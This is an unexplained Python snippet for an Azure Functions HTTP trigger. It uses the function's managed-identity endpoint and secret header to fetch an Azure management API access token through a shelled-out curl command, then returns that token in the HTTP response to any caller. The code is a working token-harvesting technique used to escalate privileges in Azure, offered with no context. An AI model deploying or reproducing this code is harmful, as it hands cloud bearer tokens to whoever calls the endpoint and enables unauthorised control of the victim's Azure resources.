---
id: d44ee0e3-2b39-48a3-8eff-f590d39bc5ae
type: code
language: py
verified: false
created_at: '2023-04-06T03:56:15.220710+00:00'
updated_at: '2023-05-24T16:02:35.207183+00:00'
---

# Code Snippet d44ee0e3

**Language**: py

```py
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```
